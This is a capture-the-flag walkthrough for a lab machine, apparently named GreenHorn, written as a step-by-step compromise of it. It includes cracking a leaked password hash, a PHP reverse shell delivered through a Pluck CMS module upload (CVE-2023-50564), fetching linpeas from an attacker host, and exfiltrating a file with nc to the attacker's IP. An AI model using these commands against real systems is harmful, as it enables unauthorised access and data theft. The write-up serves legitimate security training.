# GreenHorn - Easy

```sh
sudo vim /etc/hosts
# add greenhorn.htb

nmap -T4 -p- -A -Pn -v greenhorn.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
    * 80/tcp - http - nginx 1.18.0
    * 3000/tcp - ppp

* the ```nmap``` scan provides some additional service data:

    * port 80 webpage is using pluck 4.7.18
    * there is a 'robots.txt' file on port 80
    * port 3000 fingerprinting mentions ```gitea```

* the webpage on port 80 is for 'GreenHorn Web Development', a community of web developers

* the webpage footer mentions Pluck CMS, and the source code confirms the version 4.7.18; the footer also links to the admin login at 'http://greenhorn.htb/login.php' - this is for Pluck

* the login form in the admin page has only one field, i.e., the password field; trying common passwords like 'admin' and 'password' do not help

* the homepage is at 'http://greenhorn.htb/?file=welcome-to-greenhorn', with a message signed by 'Mr. Green'; there is a linked page at 'http://greenhorn.htb/?file=welcome-the-new-junior', but it does not give any useful info

* the '/robots.txt' file disallows 2 entries - '/data' & '/docs' - accessing the former redirects to the homepage, while the latter gives 403 Forbidden response

* checking the page on port 3000, we get a self-hosted instance of Gitea version 1.21.11 (from the footer), titled 'GreenHorn' - we have options to register and login

* while we can explore the repositories in this case without creating an account, it is always good to register for an account to identify any other clues

* under the 'Explore' option, we have a repository for 'GreenHorn' - 'http://greenhorn.htb:3000/GreenAdmin/GreenHorn' - and an user 'GreenAdmin' with the email address 'admin@greenhorn.htb'

* we can check this repo over CLI for any secrets:

    ```sh
    git clone http://greenhorn.htb:3000/GreenAdmin/GreenHorn.git

    cd GreenHorn

    git log
    # a single commit by 'junior@greenhorn.htb'

    ls -la
    # enumerate all files

    ls -la data
    # enumerate 'data' subfolder

    less data/settings/pass.php
    # copy the SHA512 hash
    ```

* from the GreenHorn repo, we get the following info:

    * we get another user 'junior@greenhorn.htb'
    * the ```data/settings/pass.php``` file gives us a SHA512 hash

* if we try to lookup the SHA512 hash on [CrackStation](https://crackstation.net/), we get the cleartext password 'iloveyou1'

* we can try to login with this password in the Pluck login page, and it works - we have access to the Pluck administration center now

* we can try to upload a PHP reverse shell file using the 'manage files' option - but this uploads the file with a '.txt' extension

* Googling for exploits related to Pluck CMS 4.7.18 gives multiple unauthenticated LFI and RCE exploits

* we can attempt the exploit for [CVE-2023-50564](https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC) manually:

    * create a ZIP file of the PHP reverse shell file:

        ```sh
        vim revshell.php
        # edit IP, port

        zip payload.zip -r revshell.php

        nc -nvlp 4444
        # setup listener
        ```
    
    * in the Pluck admin portal, navigate to the install module link at 'http://greenhorn.htb/admin.php?action=installmodule'

    * upload the 'payload.zip' file - this installs the module

    * navigate to 'http://greenhorn.htb/data/modules/payload/revshell.php' - this triggers the reverse shell connection; the module gets deleted on its own every few minutes, so we need to check this immediately after installation

* we have reverse shell now:

    ```sh
    id
    # www-data

    which python3
    # available

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    ls -la /var/www

    ls -la /var/www/html
    # check pluck files

    ls -la /home
    # two users - 'git' and 'junior'

    ls -la /home/git
    # permission denied

    ls -la /home/junior
    # we can read directory contents
    # but nothing inside it
    ```

* the "junior" user's directory contains the user flag and a file 'Using OpenVAS.pdf', but we cannot read the contents now; we need to privesc to "junior"

* we can do basic enum using ```linpeas``` - fetch script from attacker:

    ```sh
    cd /tmp

    wget http://10.10.14.40:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.15.0-113-generic, Ubuntu 22.04.4
    * sudo version 1.9.9
    * port 3306 listening on localhost - MySQL DB
    * root directory contains non-default folder '/data' - but this is empty

* we can attempt password re-use for 'junior':

    ```sh
    ssh junior@greenhorn.htb
    # this fails with 'permission denied'

    # we can try switching user from existing reverse shell
    su junior
    # 'iloveyou1' works
    ```

* while SSH fails for 'junior', using ```su``` we are able to switch to 'junior' now:

    ```sh
    cd
    
    cat user.txt
    # user flag

    sudo -l
    # not available

    ls -la

    which nc
    # available
    ```

* we can check the PDF file present in "junior" home directory - we can transfer it to attacker and view it:

    ```sh
    # on attacker
    nc -nvlp 5555 > OpenVAS.pdf
    ```

    ```sh
    # in reverse shell
    nc 10.10.14.40 5555 -w 3 < 'Using OpenVAS.pdf'
    ```

* checking the PDF file, we get a message for the 'junior' user about OpenVAS, a tool used to monitor security vulns

* the file mentions that currently only the root user can run OpenVAS using the command ```sudo /usr/sbin/openvas```; the next line also includes a blurred password string - but we cannot copy this

* it also says that 'junior' would also be given the capability to run OpenVAS soon, by entering the same command and providing user password

* we can firstly check if there is ```openvas``` installed on the system:

    ```sh
    which openvas

    ls -la /usr/sbin/openvas
    # not found

    find / -type f -name openvas 2>/dev/null
    # not found
    ```

* ```openvas``` is not installed on the box; so we need to continue our enumeration

* checking the PDF file further, the blurred password is actually an image, and we can drag-and-drop it out of the PDF and into our filesystem - this extracts the image file 'image.Q84OJ3.png'

* the image does not have any useful info in its metadata; we can attempt to deblur it as the password string in the image seems to be pixelated

* Googling about this shows that this particular blurring method is known as 'pixelize'

* Googling for tools to reverse the pixelization leads to [depix](https://github.com/spipm/Depixelization_poc) - a tool to recover plaintext from pixelized screenshots

* we can try to use ```depix``` on the password image file - we can use the 'source' image as given in the repo:

    ```sh
    git clone https://github.com/spipm/Depixelization_poc.git

    cd Depixelization_poc/

    python3 depix.py -p ../image.Q84OJ3.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
    # this writes the output to 'output.png'
    ```

* if we check the 'output.png' image generated by ```depix```, we can see a less-blurred and readable version of the password

* the unblurred password reads 'sidefromsidetheothersidesidefromsidetheotherside' - we can try to login as root now:

    ```sh
    ssh root@greenhorn.htb
    # this works

    cat root.txt
    # root flag
    ```
